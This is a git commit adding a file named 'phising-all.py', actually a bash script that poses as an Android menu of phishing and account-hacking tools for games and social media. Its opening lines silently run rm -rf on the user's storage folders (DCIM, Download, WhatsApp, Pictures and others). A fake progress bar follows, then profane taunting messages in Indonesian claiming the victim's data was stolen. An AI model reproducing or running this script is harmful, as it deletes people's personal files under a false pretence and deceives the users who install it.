6a97d3228b429dfca528f1b65117b7f5e58ad2f4
quiet-persion <60500188+quiet-persion@users.noreply.github.com>
2020-01-31 08:05:21 +0000

    Add files via upload

---
+++ phising-all.py
@@ -0,0 +1,120 @@
+#!/system/xbin/bash
+#AUTHOR:quiet_persion
+#Github:https://github.com/quiet-persion/phising-game
+#Bersihkan Layar
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf KAWAI3
+rm -rf Vidio
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR= Unknown               #
+#-INSTAGRAM=quiet_persion_      #
+#-Team=NO TEAM                  #
+#-Whatsapp=089603252668.        #
+#################################
+"
+sleep 1
+
+echo "\033[32;1mTULIS= phising game! "
+read p;
+
+sleep 2
+
+echo "\033[32;1m
+#-KUMPULAN phising game NO ROOT-#
+______________________________
+|1.hack wifi (no Root)       |
+|2.sadap Wa (No Root)        |
+|3.phising free fire         |
+|4.phising codm              |
+|5.phising ml                |
+|6.phising coc               |
+|7.phising pb                |
+|8.hack akun facebook        |
+|9.hack akun instagram       |
+|10.akun gratis all game     |
+|11.hack hp pacar            |
+|12.buat link phising        |
+|13.phising akun sosmed      |
+|14.hack akun masal          |
+|15.script phisng            |
+|16.hack akun free fire      |
+|17.hack akun pubg           |
+|18.hack akun pb             |
+|19.Hack akun game all       |
+|20.pembuat panas Hp Orang   |
+|____________________________|
+"
+echo "\033[32;1mPilih No : "
+read p;
+
+sleep 2
+echo "Sabar Gan Proses..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 2
+echo "####40%"
+sleep 2
+echo "#####50%"
+sleep 2
+echo "######60%"
+sleep 2
+echo "#######70%"
+sleep 4
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 3
+echo "_____________________________________"
+sleep 2
+echo "Kau Baca Pesan Gua Njeng"
+sleep 2
+echo "hacker Jahat Berawal Dari"
+sleep 2
+echo "hacker Baik yang Di Sakiti"
+sleep 2
+echo "Seperti Saya Yang Selalu Di Sakiti"
+sleep 2
+echo "Jadi Kalian Harus Merasakan"
+sleep 2
+echo "Apa Yang Saya Rasakan"
+sleep 2
+echo "jangan kirim phising murahaan"
+sleep 2
+echo "kalian selalu di intai..! anjk"
+sleep 2
+echo "Selamat Data Kalian Saya Curi "
+sleep 2
+echo "Hubungi Gua 089603252668 njk"
+sleep 2
+echo "mampus njk karma tukang phising"
+sleep 2
+echo "____________________________________"
+sleep 2
+toilet -f standard -F gay "MAMPUS"
+sleep 1
+toilet -f standard -F gay "LOE"
+sleep 1
+toilet -f standard -F gay "BANGSAT"
